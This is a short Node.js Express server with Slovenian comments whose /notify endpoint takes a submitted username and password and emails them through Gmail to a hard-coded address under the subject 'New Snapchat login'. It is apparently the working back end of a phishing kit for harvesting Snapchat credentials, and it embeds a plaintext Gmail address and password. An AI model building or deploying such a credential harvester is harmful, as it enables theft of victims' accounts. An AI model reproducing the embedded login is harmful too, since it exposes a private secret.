const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/notify', (req, res) => {
  const { username, password } = req.body;

  // Opomba: Zamenjajte 'vaš-e-pošta@gmail.com' z vašim resničnim e-poštnim naslovom
  // Opomba: Zamenjajte 'vaš-e-poštni-geslo' z vašim resničnim e-poštnim geslom
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'realbossjacob2@gmail.com',
      pass: 'Hs3zt9bs.'
    }
  });

  const mailOptions = {
    from: 'realbossjacob2@gmail.com',
    to: 'realbossjacob2@gmail.com',
    subject: 'Nova Snapchat prijava',
    text: `Uporabniško ime: ${username}\nGeslo: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).send(error.toString());
    }
    res.status(200).send('E-pošta poslana: ' + info.response);
  });
});

app.listen(port, () => {
  console.log(`Strežnik deluje na http://localhost:${port}`);
});
